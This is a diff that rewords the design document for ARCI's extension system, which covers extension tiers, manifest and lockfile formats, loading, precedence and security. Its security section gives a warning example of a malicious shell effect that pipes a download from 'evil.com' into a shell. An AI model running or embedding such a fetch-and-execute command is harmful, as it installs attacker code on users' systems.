@@ -1,28 +1,28 @@
 # Extensions
 
-arci supports an extension system for distributing and sharing policies, custom expression functions, and effect handlers. This document describes the extension model, manifest and lockfile formats, installation mechanics, and security considerations.
+ARCI supports an extension system for distributing and sharing policies, custom expression functions, and effect handlers. This document describes the extension model, manifest, and lockfile formats, installation mechanics, and security considerations.
 
 ## Design rationale
 
-Users want to share hook configurations in several forms: curated policies for specific frameworks or use cases, custom functions that extend the expression language, and effect handlers for integrations like Slack or Jira. Rather than building separate systems for each type, arci uses a unified extension model with three tiers of capability.
+Users want to share hook configurations in multiple forms: curated policies for specific use cases, custom functions that extend the expression language, and effect handlers for integrations like Slack or Jira. Rather than building separate systems for each type, ARCI uses a unified extension model with three tiers of capability.
 
-Policies-only extensions contain YAML policy files and nothing else. They are the simplest to create, distribute, and audit. No code execution is involved beyond evaluating the policies themselves.
+Policies-only extensions contain YAML policy files and nothing else. They are the simplest to create, distribute, and audit. No code runs beyond evaluating the policies themselves.
 
-Full extensions can include Starlark scripts that define custom macros and expression helpers. Starlark is a safe, deterministic scripting language based on Python syntax, designed for embedding in applications. It cannot access the filesystem, network, or system resources unless explicitly allowed by the host. This makes full extensions safe to install from untrusted sources while still enabling rich customization.
+Full extensions can include Starlark scripts that define custom macros and expression helpers. Starlark is a safe, deterministic scripting language based on Python syntax, designed for embedding in applications. It cannot access the filesystem, network, or system resources unless explicitly allowed by the host. Full extensions are safe to install from untrusted sources while still enabling rich customization.
 
-Native extensions use Go plugins (via the `plugin` package) or gRPC-based out-of-process plugins for maximum performance and capability. These are intended for advanced use cases like integrating with external services or implementing custom effect handlers. Native extensions require explicit trust because they execute arbitrary native code.
+Native extensions use Go plugins (via the `plugin` package) or gRPC-based out-of-process plugins for maximum performance and capability. These target advanced use cases like integrating with external services or building custom effect handlers. Native extensions require explicit trust because they execute arbitrary native code.
 
-This tiered approach lets users choose their trust level. Most users will only need policies-only extensions. Power users can leverage Starlark scripting with confidence in its sandbox. Only users with specific needs will enable native extensions, and they understand the trust implications.
+This tiered approach lets users choose their trust level. Most users only need policies-only extensions. Power users can use Starlark scripting with confidence in its sandbox. Only users with specific needs enable native extensions, and they understand the trust implications.
 
 ## Extension types
 
 ### Policies-only extensions
 
-A policies-only extension contains YAML policy files and no executable code. These are the simplest extensions to create and audit. They are ideal for sharing curated policies like safety rules, framework-specific conventions, or team standards.
+A policies-only extension contains YAML policy files and no executable code. These are the simplest extensions to create and audit. They are ideal for sharing curated policies like safety rules, convention sets, or team standards.
 
 Policies-only extensions use a minimal directory structure:
 
-```
+```text
 acme-safety-rules/
 ├── extension.toml
 └── policies/
@@ -45,7 +45,7 @@ license = "MIT"
 min_version = "0.1.0"
 ```
 
-The `policies/` directory contains YAML files in the standard arci policy format. Each file is a complete, self-contained policy document. All YAML files in this directory are automatically discovered and loaded.
+The `policies/` directory contains YAML files in the standard ARCI policy format. Each file is a complete, self-contained policy document. All YAML files in this directory are automatically discovered and loaded.
 
 Here is an example policy that blocks dangerous shell commands:
 
@@ -89,11 +89,11 @@ Policies provided by extensions follow the same structure as user-defined polici
 
 ### Full extensions
 
-Full extensions can include Starlark scripts that define custom macros for the expression language. Starlark scripts run in a sandboxed environment with no access to the filesystem, network, or system resources beyond what arci explicitly provides.
+Full extensions can include Starlark scripts that define custom macros for the expression language. Starlark scripts run in a sandboxed environment with no access to the filesystem, network, or system resources beyond what ARCI explicitly provides.
 
 A full extension adds a `scripts/` directory:
 
-```
+```text
 my-extension/
 ├── extension.toml
 ├── policies/
@@ -118,7 +118,7 @@ min_version = "0.1.0"
 macros = ["scripts/macros.star"]
 ```
 
-A Starlark script defines macros that integrate with the CEL expression system. Macros are reusable expression fragments that can be called from CEL expressions in policies:
+A Starlark script defines macros that integrate with the CEL expression system. Macros are reusable expression fragments that CEL expressions in policies can call:
 
 ```python
 # scripts/macros.star
@@ -160,7 +160,7 @@ def register_macros(registry):
     )
 ```
 
-Custom macros are namespaced by extension name in the expression language. The macros above become `$my_extension.is_protected_path()`, `$my_extension.is_destructive_command()`, and `$my_extension.exceeds_size_limit()`. This prevents collisions between extensions.
+Custom macros use the extension name as a namespace in the expression language. The preceding macros become `$my_extension.is_protected_path()`, `$my_extension.is_destructive_command()`, and `$my_extension.exceeds_size_limit()`, preventing collisions between extensions.
 
 Policies can use extension macros just like built-in macros:
 
@@ -188,9 +188,9 @@ rules:
 
 ### Native extensions
 
-Native extensions are Go plugins or gRPC services that implement the Extension interface. They have full access to system resources and can implement complex integrations, custom effect handlers, or performance-critical macros.
+Native extensions are Go plugins or gRPC services that satisfy the Extension interface. They have full access to system resources and can provide complex integrations, custom effect handlers, or performance-critical macros.
 
-```
+```text
 slack-extension/
 ├── extension.toml
 ├── go.mod
@@ -215,7 +215,7 @@ min_version = "0.1.0"
 binary = "arci-ext-slack"
 ```
 
-Native extensions implement the `Extension` interface from the `arci` extension SDK:
+Native extensions satisfy the `Extension` interface from the ARCI extension SDK:
 
 ```go
 package main
@@ -249,7 +249,7 @@ var Extension SlackExtension
 
 Native extensions can provide two types of contributions:
 
-**Macros** are reusable expression fragments that can make external calls. Unlike Starlark macros which are pure expressions, native macros can perform I/O like querying external services. The `IsOnCallMacro` example above might query a PagerDuty or Slack on-call schedule:
+**Macros** are reusable expression fragments that can make external calls. Unlike Starlark macros which are pure expressions, native macros can perform I/O like querying external services. The `IsOnCallMacro` example shown earlier might query a PagerDuty or Slack on-call schedule:
 
 ```yaml
 rules:
@@ -262,7 +262,7 @@ rules:
       action: deny
 ```
 
-**Effect handlers** implement custom effect types that policies can trigger. The policy model defines built-in effects like `setState`, `notify`, and `log`. Native extensions can add new effect types that integrate with external services. For example, a Slack extension might provide a `slack:send_message` effect:
+**Effect handlers** provide custom effect types that policies can trigger. The policy model defines built-in effects like `setState`, `notify`, and `log`. Native extensions can add new effect types that integrate with external services. A Slack extension might provide a `slack:send_message` effect:
 
 ```yaml
 rules:
@@ -278,9 +278,9 @@ rules:
         when: on_pass
 ```
 
-Effect handlers receive the evaluation context and effect configuration, execute their side effect, and return success or failure. Effect execution failures are logged but don't affect the tool call decision, consistent with fail-open semantics.
+Effect handlers receive the evaluation context and effect configuration, execute their side effect, and return success or failure. The system logs effect execution failures but they do not affect the tool call decision, consistent with fail-open semantics.
 
-Native extensions require explicit trust. When you run `arci extension add` for a native extension, arci prompts for confirmation and records the trust decision in your configuration. Without explicit trust, native extensions will not load.
+Native extensions require explicit trust. When you run `arci extension add` for a native extension, ARCI prompts for confirmation and records the trust decision in your configuration. Without explicit trust, native extensions do not load.
 
 ## Extension metadata
 
@@ -311,7 +311,7 @@ binary = "arci-ext-name"
 
 ## Manifest format
 
-The manifest declares which extensions a user or project wants installed. User-level extensions live in `<user-config-dir>/arci/extensions.toml` (for example, `~/.config/arci/extensions.toml` on Linux). Project-level extensions live in `.arci/extensions.toml`.
+The manifest declares which extensions a user or project wants installed. User-level extensions live in `<user-config-dir>/arci/extensions.toml` (such as `~/.config/arci/extensions.toml` on Linux). Project-level extensions live in `.arci/extensions.toml`.
 
 ```toml
 [extensions]
@@ -328,13 +328,13 @@ The manifest declares which extensions a user or project wants installed. User-l
 "community-safety" = { version = ">=1.0,<2.0" }
 ```
 
-The manifest is intended to be human-edited and version-controlled. Project manifests should be committed to the repository so that all team members share the same extensions.
+Users edit the manifest directly and check it into version control. Teams should commit project manifests to the repository so that all members share the same extensions.
 
 Version constraints follow semver syntax: `"1.0.0"` for exact, `">=1.0,<2.0"` for ranges, `"^1.0"` for compatible updates, `"~1.0"` for patch updates only.
 
 ## Lockfile format
 
-The lockfile records exactly what is installed, capturing resolved versions and commit SHAs for reproducibility. The lockfile lives alongside its manifest: `<user-config-dir>/arci/extensions.lock` for user extensions, `.arci/extensions.lock` for project extensions.
+The lockfile records exactly what the system installed, capturing resolved versions and commit SHAs for reproducibility. The lockfile lives alongside its manifest: `<user-config-dir>/arci/extensions.lock` for user extensions, `.arci/extensions.lock` for project extensions.
 
 ```toml
 # Generated by arci - do not edit manually
@@ -366,21 +366,21 @@ source = "registry"
 sha256 = "a1b2c3d4e5f6..."
 ```
 
-The lockfile includes the arci version that generated it. If you upgrade arci and run extension commands, the tooling can warn about potential compatibility issues and prompt for re-resolution.
+The lockfile includes the ARCI version that generated it. If you upgrade ARCI and run extension commands, the tooling can warn about potential compatibility issues and prompt for re-resolution.
 
-For git sources, the resolved commit SHA is recorded even if the manifest specifies a tag or branch. Tags can be moved; commits cannot. This ensures `arci extension sync` installs exactly what was locked, not whatever the tag points to now.
+For git sources, the lockfile records the resolved commit SHA even if the manifest specifies a tag or branch. Tags can move; commits cannot. The `arci extension sync` command installs exactly what the lockfile captured, not whatever the tag points to now.
 
-For registry sources, the SHA256 hash of the extension archive is recorded. At sync time, arci verifies the installed extension matches this hash.
+For registry sources, the lockfile records the SHA256 hash of the extension archive. At sync time, ARCI verifies the installed extension matches this hash.
 
-For local paths, only the path and version are recorded. Local extensions are inherently mutable during development.
+For local paths, the lockfile records only the path and version. Local extensions are inherently mutable during development.
 
 ## User and project extension interaction
 
-User extensions (from `<user-config-dir>/arci/extensions.toml`) and project extensions (from `.arci/extensions.toml`) are resolved and locked independently. Each lockfile contains only what is declared in its corresponding manifest.
+The system resolves and locks user extensions (from `<user-config-dir>/arci/extensions.toml`) and project extensions (from `.arci/extensions.toml`) independently. Each lockfile contains only what its corresponding manifest declares.
 
-At runtime, arci loads the union of user and project extensions. If there is a version conflict where the user wants `my-extension==1.0` and the project wants `my-extension==2.0`, loading fails with a clear error message. There are no implicit precedence rules where one silently wins.
+At runtime, ARCI loads the union of user and project extensions. If a version conflict exists where the user wants `my-extension==1.0` and the project wants `my-extension==2.0`, loading fails with a clear error message. No implicit precedence rules let one silently win.
 
-This design keeps each lockfile focused on its own scope. A teammate with different user-level extensions will not cause churn in the project lockfile, and the project lock will not mysteriously include extensions that are not in the project manifest.
+Each lockfile stays focused on its own scope. A teammate with different user-level extensions does not cause churn in the project lockfile, and the project lock does not mysteriously include extensions outside the project manifest.
 
 If you need to resolve a conflict, adjust your user configuration for that project. You could remove the conflicting user extension, align versions, or add a project-local override in your untracked configuration.
 
@@ -388,7 +388,7 @@ If you need to resolve a conflict, adjust your user configuration for that proje
 
 The `arci extension` command group manages extensions:
 
-```
+```text
 arci extension list                        # Show installed extensions
 arci extension add <path-or-url>           # Add extension, lock, install
 arci extension remove <name>               # Remove extension, update lock
@@ -405,7 +405,7 @@ The `remove` command removes an extension from the manifest, updates the lockfil
 
 The `lock` command resolves the manifest to a lockfile without installing anything. This is useful for CI environments where you want to generate a lockfile but install in a separate step.
 
-The `sync` command installs exactly what is in the lockfile without re-resolving. This ensures reproducibility across machines. A new team member clones the repo and runs `arci extension sync` to get exactly what everyone else has.
+The `sync` command installs exactly what is in the lockfile without re-resolving, guaranteeing reproducibility across machines. A new team member clones the repo and runs `arci extension sync` to get exactly what everyone else has.
 
 The `init` command scaffolds a new extension:
 
@@ -421,9 +421,9 @@ This generates the directory structure, `extension.toml`, and starter files appr
 
 ## Extension discovery and loading
 
-At startup, arci discovers extensions from configured directories. The default locations are `<user-data-dir>/arci/extensions/` for user extensions and `.arci/extensions/` for project extensions.
+At startup, ARCI discovers extensions from configured directories. The default locations are `<user-data-dir>/arci/extensions/` for user extensions and `.arci/extensions/` for project extensions.
 
-Each subdirectory containing an `extension.toml` is loaded as an extension. The loading process validates the metadata, verifies type-specific requirements, and registers the extension's contributions:
+The loader treats each subdirectory containing an `extension.toml` as an extension. The loading process validates the metadata, verifies type-specific requirements, and registers the extension's contributions:
 
 1. Read and parse `extension.toml`
 2. Validate required fields and version compatibility
@@ -432,47 +432,47 @@ Each subdirectory containing an `extension.toml` is loaded as an extension. The 
 5. For native extensions, verify trust and load the plugin binary
 6. Register macros, effect handlers, and policy paths
 
-After discovery, arci collects macros from all extensions (namespaced by extension name), effect handlers from all extensions, and policy paths from all extensions. These are merged into the runtime configuration.
+After discovery, ARCI collects macros from all extensions (using extension names as namespaces), effect handlers from all extensions, and policy paths from all extensions, then merges them into the runtime configuration.
 
-Extensions are loaded once at startup. If extensions change (via `arci extension add` or similar), the daemon must be restarted to pick up the changes. The CLI reloads extensions on each invocation.
+The system loads extensions once at startup. If extensions change (via `arci extension add` or similar), the daemon must restart to pick up the changes. The CLI reloads extensions on each invocation.
 
 ## Policy precedence
 
-Extension-provided policies fit into the existing configuration precedence cascade. Extension policies are loaded at a low precedence level, just above built-in defaults, allowing users and projects to override them.
+Extension-provided policies fit into the existing configuration precedence cascade. The system loads extension policies at a low precedence level, just past built-in defaults, allowing users and projects to override them.
 
 The full precedence chain from highest to lowest:
 
-1. Local assistant (`local_assistant`) — `.arci/arci.local.<assistant>.yaml` (highest precedence)
-2. Local (`local`) — `.arci/arci.local.yaml`
-3. Project assistant (`project_assistant`) — `.arci/arci.<assistant>.yaml`
-4. Project (`project`) — `.arci/arci.yaml`
-5. User assistant (`user_assistant`) — `<user-config-dir>/arci/config.<assistant>.yaml`
-6. User (`user`) — `<user-config-dir>/arci/config.yaml`
-7. Site assistant (`site_assistant`) — `<site-config-dir>/arci/config.<assistant>.yaml`
-8. Site (`site`) — `<site-config-dir>/arci/config.yaml`
+1. Local assistant (`local_assistant`): `.arci/arci.local.<assistant>.yaml` (highest precedence)
+2. Local (`local`): `.arci/arci.local.yaml`
+3. Project assistant (`project_assistant`): `.arci/arci.<assistant>.yaml`
+4. Project (`project`): `.arci/arci.yaml`
+5. User assistant (`user_assistant`): `<user-config-dir>/arci/config.<assistant>.yaml`
+6. User (`user`): `<user-config-dir>/arci/config.yaml`
+7. Site assistant (`site_assistant`): `<site-config-dir>/arci/config.<assistant>.yaml`
+8. Site (`site`): `<site-config-dir>/arci/config.yaml`
 9. Extension policies
-10. Default assistant (`default_assistant`) — built-in assistant-specific defaults
-11. Default (`default`) — built-in universal defaults (lowest precedence)
+10. Default assistant (`default_assistant`): built-in assistant-specific defaults
+11. Default (`default`): built-in universal defaults (lowest precedence)
 
-This means extensions provide defaults that users and projects can override. An extension might ship a policy named `block-dangerous-rm`, but a specific project could define a policy with the same name that overrides it.
+Extensions provide defaults that users and projects can override. An extension might ship a policy named `block-dangerous-rm`, but a specific project could define a policy with the same name that overrides it.
 
-Within the extension tier, policies are loaded in extension name order (alphabetically). If two extensions define policies with the same name, the later one wins, but this should be rare. Extension authors should use namespaced policy names like `acme-safety:dangerous-commands` to avoid collisions.
+Within the extension tier, the system loads policies in extension name order (alphabetically). If two extensions define policies with the same name, the later one wins, but this should be rare. Extension authors should use namespaced policy names like `acme-safety:dangerous-commands` to avoid collisions.
 
-Note that cascade precedence determines which policy definition wins when names collide, but it does not affect evaluation order. Policies are evaluated according to their `config.priority` setting (critical, high, medium, low), not their cascade level. A high-priority policy from an extension evaluates before a medium-priority policy from the project. See the [Execution model](hooks/execution-model.md) for details on priority cascading and evaluation order.
+Cascade precedence determines which policy definition wins when names collide, but it does not affect evaluation order. The evaluator processes policies according to their `config.priority` setting (critical, high, medium, low), not their cascade level. A high-priority policy from an extension evaluates before a medium-priority policy from the project. See the [Execution model](hooks/execution-model.md) for details on priority cascading and evaluation order.
 
 ## Security considerations
 
 Extensions have different trust requirements based on their type.
 
-Policies-only extensions contain only YAML files. They are the easiest to audit because there is no executable code beyond the CEL expressions in the policies themselves. However, policies can include shell effects that execute commands if shell effects are enabled. A malicious policy with an effect like `{ type: shell, command: "curl evil.com | sh" }` is dangerous regardless of extension type. The audit surface is smaller and more readable, but trust is still required.
+Policies-only extensions contain only YAML files. They are the easiest to audit because no executable code exists beyond the CEL expressions in the policies themselves. However, policies can include shell effects that execute commands if the user enables shell effects. A malicious policy with an effect like `{ type: shell, command: "curl evil.com | sh" }` is dangerous regardless of extension type. The audit surface is smaller and more readable, but trust is still required.
 
-Starlark scripts in full extensions run in a sandbox. The Starlark runtime has no built-in access to the filesystem, network, or system resources. arci exposes a limited API to scripts: string manipulation, regex matching, and read-only access to the evaluation context. Scripts cannot make network requests, read arbitrary files, or execute shell commands. This makes full extensions safe to install from untrusted sources, though you should still review what macros they provide.
+Starlark scripts in full extensions run in a sandbox. The Starlark runtime has no built-in access to the filesystem, network, or system resources. ARCI exposes a limited API to scripts: string manipulation, pattern matching, and read-only access to the evaluation context. Scripts cannot make network requests, read arbitrary files, or execute shell commands. Full extensions are safe to install from untrusted sources, though you should still review what macros they provide.
 
-Native extensions execute arbitrary native code with full system access. They can read files, make network requests, and execute shell commands. Installing a native extension grants it the same privileges as arci itself. For this reason, native extensions require explicit trust. When you add a native extension, arci prompts for confirmation and records the trust decision. Native extensions from untrusted sources will not load without explicit approval.
+Native extensions execute arbitrary native code with full system access. They can read files, make network requests, and execute shell commands. Installing a native extension grants it the same privileges as ARCI itself. For this reason, native extensions require explicit trust. When you add a native extension, ARCI prompts for confirmation and records the trust decision. Native extensions from untrusted sources do not load without explicit approval.
 
 The lockfile provides supply chain protection by recording commit SHAs for git sources and hashes for registry sources. The `sync` command verifies that installed extensions match locked values, detecting tampering between lock and install time. However, this does not protect against a malicious extension at initial lock time.
 
-For high-security environments, we recommend installing extensions only from trusted sources such as internal git repos, pinning to specific commits rather than tags, auditing extension code before installation, using only policies-only or full extensions (avoiding native), and using the lockfile in CI to ensure only approved extensions are installed.
+For high-security environments, best practices include installing extensions only from trusted sources such as internal git repos, pinning to specific commits rather than tags, auditing extension code before installation, using only policies-only or full extensions (avoiding native), and using the lockfile in CI to ensure the system installs only approved extensions.
 
 ## Scaffolding templates
 
@@ -484,7 +484,7 @@ arci extension init acme-safety-rules --policies-only
 
 Generates:
 
-```
+```text
 acme-safety-rules/
 ├── extension.toml
 ├── README.md
@@ -533,7 +533,7 @@ arci extension init my-extension
 
 Generates:
 
-```
+```text
 my-extension/
 ├── extension.toml
 ├── README.md
@@ -547,12 +547,12 @@ With starter Starlark code demonstrating macro definitions.
 
 ## Future considerations
 
-Several enhancements are deferred to future versions.
+These enhancements target future versions.
 
-An extension registry could provide centralized discovery, version hosting, and verified publisher badges for community extensions, similar to pkg.go.dev or VS Code's extension marketplace. This requires significant infrastructure and is out of scope for initial release.
+An extension registry could provide centralized discovery, version hosting, and verified publisher badges for community extensions, similar to pkg.go.dev or VS Code's extension marketplace. This requires substantial infrastructure and is out of scope for initial release.
 
-Extension configuration could allow extensions to accept user-provided settings. A Slack extension might want a `default_channel` setting. This could be handled via the existing configuration system, perhaps in an `[extensions.config]` section of the manifest.
+Extension configuration could allow extensions to accept user-provided settings. A Slack extension might want a `default_channel` setting. The existing configuration system could handle this, perhaps in an `[extensions.config]` section of the manifest.
 
-Hot reloading would allow the daemon to pick up new extensions without restart. This adds complexity around extension state and is deferred for now.
+Hot reloading would allow the daemon to pick up new extensions without restart. This adds complexity around extension state, so the team defers it for now.
 
 Cryptographic signatures on extensions, verified against a set of trusted publisher keys, could enable a verified extensions tier for the future registry. This would allow users to trust extensions from verified publishers without manual review.
